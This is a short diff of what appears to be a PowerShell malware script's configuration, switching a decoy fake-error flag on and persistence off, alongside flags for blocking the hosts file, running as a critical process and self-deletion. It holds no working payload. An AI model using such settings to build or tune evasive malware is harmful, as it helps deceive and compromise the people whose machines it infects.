@@ -3,8 +3,8 @@ $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
-$fakeerror = $false
-$persistence = $true
+$fakeerror = $true
+$persistence = $false
 
 if ($debug) {
     $ProgressPreference = 'Continue'
